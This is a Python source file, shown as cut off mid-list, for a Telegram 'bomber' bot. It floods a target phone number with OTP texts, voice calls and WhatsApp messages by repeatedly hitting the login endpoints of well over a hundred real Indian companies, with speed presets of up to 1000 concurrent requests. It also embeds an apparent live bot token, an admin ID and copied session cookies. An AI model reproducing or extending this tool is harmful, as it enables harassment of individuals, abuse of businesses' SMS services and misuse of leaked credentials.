import requests
import json
import logging
import os
import sqlite3
import asyncio
import re
import time
import aiohttp
import ast
from datetime import datetime, timedelta

# Telegram Imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode, ChatType
from telegram.request import HTTPXRequest

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- CONFIGURATION ---
TOKEN = "8271713119:AAHTQP95hg2dvLsDFrRZl8vQwuBOpb07tvA"  # Apne Bot ka token yahan dalein
ADMIN_ID = 5406953620              # Apna Admin ID yahan dalein

# --- BOMBER CONFIGURATION ---
SPEED_PRESETS = {
    1: {'name': '🐢 Very Slow', 'max_concurrent': 30, 'delay': 0.5},
    2: {'name': '🚶 Slow', 'max_concurrent': 50, 'delay': 0.3},
    3: {'name': '⚡ Medium', 'max_concurrent': 100, 'delay': 0.1},
    4: {'name': '🚀 Fast', 'max_concurrent': 200, 'delay': 0.05},
    5: {'name': '⚡💥 FLASH MODE', 'max_concurrent': 1000, 'delay': 0.001}
}

# ============ ORIGINAL BOM10.PY APIS (111 APIs) ============
ORIGINAL_BOMBER_APIS = [
    # ================= NEW CALL APIS =================
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
        "count": 1
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
        "count": 1
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 1
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 1
    },
    {
        "name": "Zivame Voice Call",
        "url": "https://api.zivame.com/v2/customer/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}',
        "count": 1
    },

    # ================= NEW WHATSAPP APIS =================
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "count": 1
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
        "count": 1
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}',
        "count": 1
    },

    # ================= NEW SMS APIS =================
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
        "count": 5
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "count": 5
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 5
    },
    {
        "name": "GoKwik SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
        "count": 5
    },
    {
        "name": "NewMe SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
        "count": 5
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
        "count": 5
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "count": 5
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
        "count": 5
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}',
        "count": 5
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
        "count": 5
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}',
        "count": 5
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
        "count": 5
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
        "count": 5
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
        "count": 5
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
        "count": 5
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}',
        "count": 5
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}',
        "count": 5
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}',
        "count": 5
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}',
        "count": 5
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
        "count": 5
    },

    # ================= OLD APIS =================
    {"url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "method": "GET", "headers": {}, "data": None, "count": 100},
    {"url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}), "count": 10},
    {"url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"}, "data": lambda phone: json.dumps({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"}), "count": 10},
    {"url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None, "count": 10},
    {"url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}), "count": 5},
    {"url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", "method": "POST", "headers": {}, "data": None, "count": 50},
    {"url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}), "count": 20},
    {"url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"content-type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3", "count": 5},
    {"url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 5},
    {"url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}), "count": 5},
    {"url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}), "count": 15},
    {"url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone}), "count": 2},
    {"url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 5},
    {"url": "https://api.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_no": phone}), "count": 5},
    {"url": "https://www.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"telephone": phone}), "count": 5},
    {"url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}&current_page=login", "count": 10},
    {"url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91"}), "count": 5},
    {"url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"contact_number": phone}), "count": 5},
    {"url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone}), "count": 5},
    {"url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 5},
    {"url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone}), "count": 5},
    {"url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None, "count": 5},
    {"url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}"}), "count": 5},
    {"url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_number": phone}), "count": 5},
    {"url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91"}), "count": 3},
    {"url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone}), "count": 10},
    {"url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone}), "count": 5},
    {"url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"contactNo={phone}&countryCode=%2B91", "count": 5},
    {"url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true", "method": "GET", "headers": {}, "data": None, "count": 5},
    {"url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 5},
    {"url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"is_otp": 1, "mobile": phone}), "count": 10},
    {"url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 3},
    {"url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone}), "count": 5},
    {"url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone}), "count": 3},
    {"url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone}), "count": 3},
    {"url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}", "count": 2},
    {"url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1}), "count": 2},
    {"url": "https://zerodha.com/account/registration.php", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone}), "count": 100},
    {"url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile_psid": phone}), "count": 50},
    {"url": "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}", "method": "POST", "headers": {}, "data": None, "count": 2},
    {"url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phonenumber": phone}), "count": 20},
    {"url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone": phone, "type": "p"}), "count": 5},
    {"url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}), "count": 10},
    {"url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile={phone}", "count": 5},
    {"url": "https://www.nobroker.in/api/v1/account/user/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone=%2B91{phone}", "count": 20},
    {"url": "https://www.tyreplex.com/includes/ajax/gfend.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}", "count": 5},
    {"url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": phone}), "count": 20},
    {"url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"username": f"+91{phone}"}), "count": 5},
    {"url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"mobile": phone}), "count": 10},
    {"url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"contact={phone}", "count": 5},
    {"url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"number": phone}), "count": 20},
    {"url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: json.dumps({"phone_number": phone}), "count": 20},
    {"url": "https://api.olacabs.com/v1/authorization/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone": "{phone}", "country_code": "+91"}}', "count": 5},
    {"url": "https://www.swiggy.com/dapi/auth/sms", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile": "{phone}"}}', "count": 5},
    {"url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=login", "count": 5},
    {"url": "https://www.amazon.in/ap/register", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phoneNumber={phone}", "count": 2},
    {"url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"loginId":"{phone}"}}', "count": 5},
    {"url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","countryCode":"+91"}}', "count": 5},
    {"url": "https://www.phonepe.com/apis/v3/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://gpay.app.goo.gl/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}', "count": 2},
    {"url": "https://auth.uber.com/v3/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"+91{phone}"}}', "count": 5},
    {"url": "https://www.myntra.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://www.ajio.com/api/v2/users/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}', "count": 5},
    {"url": "https://www.bigbasket.com/auth/v2/otp/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://www.dunzo.com/api/v1/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://rapido.bike/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://api.oyorooms.com/api/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://www.makemytrip.com/api/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://www.goibibo.com/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://api.cred.club/api/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://jupiter.money/api/v2/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://www.kooapp.com/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://sharechat.com/api/v1/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://mojapp.in/api/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://share.myjosh.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://www.roposo.com/api/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5},
    {"url": "https://api.chingari.io/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}', "count": 5},
    {"url": "https://trell.co/api/v3/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "count": 5},
    {"url": "https://api.mitron.tv/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "count": 5}
]

# ============ APIS.PY APIS (100+ APIs) ============
APIS_PY_APIS = [
    # ============ ORIGINAL API ============
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100
    },
    # ============ NEW APIS ============
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10
    },
    
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10
    },
    
    {
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None,
        "count": 10
    },
    
    # ============ COUNT=5 (3).txt APIs ============
    {
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5
    },
    
    {
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": None,
        "count": 500
    },
    
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20
    },
    
    {
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
